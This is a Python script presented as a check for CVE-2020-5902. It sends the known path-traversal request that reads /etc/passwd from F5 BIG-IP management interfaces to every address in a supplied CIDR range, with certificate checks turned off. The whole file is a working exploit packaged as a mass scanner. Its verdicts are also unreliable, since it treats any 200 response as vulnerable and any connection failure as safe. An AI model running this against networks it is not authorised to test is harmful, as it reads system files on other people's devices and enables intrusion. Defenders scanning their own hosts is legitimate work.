#CVE-2020-5902 check
import ipaddress
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import sys

def prYellow(msg): 
    print("\033[93m {}\033[00m" .format(msg))
    
def prGreen(msg): 
    print("\033[92m {}\033[00m" .format(msg)) 

def prRed(msg): 
    print("\033[91m {}\033[00m" .format(msg)) 

def prdCyan(msg): 
    print("\033[96m {}\033[00m" .format(msg)) 

def check():
    count=0
    vuln=0
    noVuln=0
    for n in NETWORKS:
        
        net = ipaddress.ip_network(n)
        for ip in ipaddress.IPv4Network(net):
            
            count+=1
            url="https://"+str(ip)+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
            
            #req = requests.get("http://"+str(ip)+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd")
            
            try:
                prYellow("scanning: {}".format(str(ip)))
                resp2 = requests.get(url, verify=False, timeout=3)
                if "200" in str(resp2.status_code):
                    vuln+=1
                    prRed("{} is Vuln CVE-2020-5902".format(str(ip)))
                    prRed("Access: {}".format(url))
                else:
                    noVuln+=1
                    prGreen("{} is not vulnerable.".format(str(ip)))
            except:
                noVuln+=1
                prGreen("{} is not vulnerable.".format(str(ip)))
                pass
            
    prdCyan("Scan Finished, Total scan : {} URL\n Total vuln: {} IP\n Total not vuln: {} IP".format(str(count), str(vuln), str(noVuln)))
    

if len(sys.argv) != 2:
    prdCyan("Please add one IP CIDR as argument\nex: python3 {} \"192.168.0.1/24\"".format(sys.argv[0]))
else: 
    NETWORKS = [sys.argv[1]]
    check()